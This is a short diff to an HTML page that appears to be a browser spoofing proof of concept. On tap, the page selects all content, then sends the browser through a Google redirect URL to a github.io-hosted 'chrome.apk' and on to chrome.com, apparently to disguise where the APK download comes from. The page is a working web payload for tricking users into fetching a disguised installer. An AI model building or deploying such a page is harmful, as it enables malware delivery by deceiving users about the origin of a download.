@@ -6,39 +6,28 @@
 
 <script>
 function trigger() {
-  // Step 1: force selection on Origin A
+  // 1. Create selection on Origin A
   document.execCommand("selectAll");
 
-  // Step 2: navigate cross-origin
+  // 2. First navigation: Google redirect URL
   setTimeout(() => {
-    location.href = "https://chrome.com/";
+    location.href =
+      "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
   }, 50);
 }
-</script>
 
-<style>
-body {
-  font-family: sans-serif;
-}
-iframe {
-  width: 100%;
-  height: 300px;
-  border: 2px solid red;
-}
-</style>
+// 3. After landing on google.com, redirect again to chrome.com
+window.addEventListener("load", () => {
+  if (location.hostname === "www.google.com") {
+    setTimeout(() => {
+      location.href = "https://chrome.com";
+    }, 800);
+  }
+});
+</script>
 </head>
 
 <body onmousedown="trigger()">
-  <h2>SPOOF</h2>
-  <p>Tap anywhere</p>
-
-  <hr>
-
-  <p>Cross-origin iframe (should NOT inherit selection context):</p>
-
-  <iframe
-    src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3"
-    sandbox
-  ></iframe>
+  <h2>Tap anywhere</h2>
 </body>
 </html>
